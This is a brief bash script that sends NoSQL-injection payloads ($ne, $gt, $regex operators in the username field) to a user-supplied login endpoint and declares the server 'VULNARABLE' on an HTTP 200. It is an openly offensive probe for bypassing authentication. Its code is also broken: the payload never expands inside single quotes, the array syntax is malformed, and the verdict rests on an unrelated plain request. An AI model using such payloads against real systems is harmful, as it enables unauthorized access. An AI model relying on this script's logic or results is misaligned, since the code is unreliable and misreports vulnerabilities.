#!/bin/bash

read -p "eneter a base url ::" base_url
read -p "inter a hiting endpoint :: " endpoint

query=({"$ne":""}, {"$gt":""}, {"$regex":".*"})


NOSQL_inj(){

local url=$1


for qry in "${query[@]}"; do
injection=$(curl -X POST -H "Content-Type: application/json" -d '{"name": "${qry}", "password": "onetwothree"}' "${url}")

done

STATUS=$(curl -s -o /dev/null/ -w "%{http_code}" "${url}")

if [ "$STATUS" == 200 ]; then
echo "--------------------------------------------"
    echo "SERVER IS VULNARABLE..,"
echo "-----------------------------------------------"
else
    echo "SERVER is not vunarable../"
fi

echo "---------------------------------------------------"
echo "STATUS is :: $STATUS"
echo "---------------------------------------------------"

echo "$injection"
echo "---------------------------------------------------"

}

NOSQL_inj "${base_url}${endpoint}"

